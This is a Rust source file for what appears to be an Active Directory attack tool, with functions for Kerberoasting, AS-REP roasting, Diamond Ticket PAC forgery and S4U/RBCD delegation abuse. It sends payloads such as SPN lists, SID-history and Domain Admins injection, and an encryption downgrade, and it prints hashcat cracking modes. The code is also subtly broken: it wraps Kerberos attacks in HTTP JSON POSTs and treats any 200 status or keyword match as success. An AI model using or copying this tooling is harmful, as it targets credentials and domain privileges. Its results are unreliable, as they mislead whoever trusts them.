use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn roast(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!(
        "{} Kerberoasting — TGS Request & Hash Extraction",
        "[*]".cyan().bold()
    );
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let spns = [
        "HTTP/target.com",
        "MSSQLSvc/sql.target.com:1433",
        "CIFS/fileserver.target.com",
        "LDAP/dc.target.com/389",
        "HOST/server.target.com",
        "RPCSS/server.target.com",
        "WWW/web.target.com",
        "SMTP/mail.target.com",
    ];

    let mut hashes = Vec::new();
    for spn in &spns {
        let body = serde_json::json!({"action": "kerberoast", "spn": spn, "format": "hashcat"});
        match client.post(url).json(&body).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let text = resp.text().await.unwrap_or_default();
                let has_hash = text.contains("$krb5tgs$")
                    || text.contains("kerberoast")
                    || text.contains("hash");
                let tag = if has_hash {
                    "HASH EXTRACTED".red().bold().to_string()
                } else if status == 200 {
                    "no hash".to_string()
                } else {
                    format!("status={}", status)
                };
                println!("  {} {:40} {}", "*".cyan(), spn, tag);
                if has_hash {
                    hashes.push(spn.to_string());
                }
            }
            Err(_) => {
                println!("  {} {:40} error", "*".red(), spn);
            }
        }
    }

    if !hashes.is_empty() {
        println!(
            "\n{} {} TGS hash(es) extracted! Crack with hashcat -m 13100.",
            "[!]".red().bold(),
            hashes.len()
        );
    } else {
        println!("\n{} No TGS hashes extracted.", "[-]".yellow().bold());
    }
    Ok(())
}

pub async fn asrep(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!(
        "{} AS-REP Roasting — Preauth-Disabled Account Detection",
        "[*]".cyan().bold()
    );
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let users = [
        "admin",
        "administrator",
        "guest",
        "krbtgt",
        "svc-iis",
        "svc-sql",
        "svc-mssql",
        "svc-exchange",
        "svc-backup",
        "svc-ldap",
        "test",
        "user",
    ];

    let mut found = Vec::new();
    for user in &users {
        let body = serde_json::json!({"action": "asrep_roast", "user": user, "format": "hashcat"});
        match client.post(url).json(&body).send().await {
            Ok(resp) => {
                let _status = resp.status().as_u16();
                let text = resp.text().await.unwrap_or_default();
                let has_hash = text.contains("$krb5asrep$")
                    || text.contains("asrep")
                    || text.contains("preauth");
                let tag = if has_hash {
                    "NO PREAUTH".red().bold().to_string()
                } else {
                    "requires preauth".to_string()
                };
                println!("  {} {:25} {}", "*".cyan(), user, tag);
                if has_hash {
                    found.push(user.to_string());
                }
            }
            Err(_) => {
                println!("  {} {:25} error", "*".red(), user);
            }
        }
    }

    if !found.is_empty() {
        println!(
            "\n{} {} account(s) with no preauth! Crack with hashcat -m 18200.",
            "[!]".red().bold(),
            found.len()
        );
    } else {
        println!("\n{} All accounts require preauth.", "[-]".green().bold());
    }
    Ok(())
}

pub async fn diamond(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Diamond Ticket — PAC Manipulation", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let manipulations = [
        (
            "SID history injection",
            serde_json::json!({"action": "diamond", "manipulation": "sid_history", "sid": "S-1-5-21-...-512"}),
        ),
        (
            "PAC group injection",
            serde_json::json!({"action": "diamond", "manipulation": "group", "group": "Domain Admins", "rid": 512}),
        ),
        (
            "Extra SID addition",
            serde_json::json!({"action": "diamond", "manipulation": "extra_sid", "sid": "S-1-5-21-...-519"}),
        ),
        (
            "PAC type manipulation",
            serde_json::json!({"action": "diamond", "manipulation": "pac_type", "type": "NTLM_SUPPLEMENTAL_CREDENTIAL"}),
        ),
        (
            "Encryption downgrade",
            serde_json::json!({"action": "diamond", "manipulation": "enc_downgrade", "from": "aes256", "to": "rc4"}),
        ),
    ];

    for (name, body) in &manipulations {
        match client.post(url).json(&body).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let text = resp.text().await.unwrap_or_default();
                let tag = if text.contains("success") || text.contains("forged") || status == 200 {
                    "POSSIBLE".red().bold().to_string()
                } else {
                    format!("status={}", status)
                };
                println!("  {} {:35} {}", "*".cyan(), name, tag);
            }
            Err(_) => {
                println!("  {} {:35} error", "*".red(), name);
            }
        }
    }
    println!(
        "\n{} Diamond tickets modify legitimate TGT PAC data.",
        "[*]".cyan().bold()
    );
    Ok(())
}

pub async fn s4u(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!(
        "{} S4U2Self/S4U2Proxy — Constrained Delegation Abuse",
        "[*]".cyan().bold()
    );
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let tests = [
        (
            "S4U2Self impersonation",
            serde_json::json!({"action": "s4u2self", "user": "Administrator", "service": "HTTP/target.com"}),
        ),
        (
            "S4U2Proxy delegation",
            serde_json::json!({"action": "s4u2proxy", "user": "Administrator", "from": "cifs/fileserver", "to": "HTTP/webserver"}),
        ),
        (
            "Protocol transition",
            serde_json::json!({"action": "s4u", "type": "protocol_transition", "user": "admin"}),
        ),
        (
            "Resource-based delegation",
            serde_json::json!({"action": "s4u", "type": "rbcd", "target": "DC01$", "msds-allowedtoactonbehalfofotheridentity": "attacker$"}),
        ),
    ];

    for (name, body) in &tests {
        match client.post(url).json(&body).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let text = resp.text().await.unwrap_or_default();
                let tag = if text.contains("ticket") || text.contains("success") || status == 200 {
                    "DELEGATION ABLE".red().bold().to_string()
                } else {
                    format!("status={}", status)
                };
                println!("  {} {:40} {}", "*".cyan(), name, tag);
            }
            Err(_) => {
                println!("  {} {:40} error", "*".red(), name);
            }
        }
    }
    println!(
        "\n{} S4U allows service impersonation via constrained delegation.",
        "[*]".cyan().bold()
    );
    Ok(())
}
